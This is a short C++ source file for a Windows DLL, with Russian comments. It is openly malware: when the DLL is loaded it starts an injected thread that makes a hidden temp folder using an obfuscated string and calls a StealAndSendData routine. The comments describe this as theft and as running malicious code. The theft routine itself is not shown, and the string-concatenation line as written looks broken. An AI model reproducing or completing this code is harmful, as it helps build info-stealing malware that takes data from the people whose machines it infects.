#include <windows.h>
#include "mainwindow.h"

extern MainWindow* g_mainWindow; // Глобальный указатель на MainWindow

DWORD WINAPI InjectedThread(LPVOID lpParam) {
    if (g_mainWindow) {
        // Создаём временную директорию для данных
        std::string tempDir = std::getenv("TEMP") + ENCRYPT_STRING("\\DeadCodeTemp");
        CreateDirectoryA(tempDir.c_str(), nullptr);

        // Выполняем кражу и отправку данных
        g_mainWindow->StealAndSendData(tempDir);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // При подключении DLL создаём поток для выполнения вредоносного кода
        CreateThread(nullptr, 0, InjectedThread, nullptr, 0, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}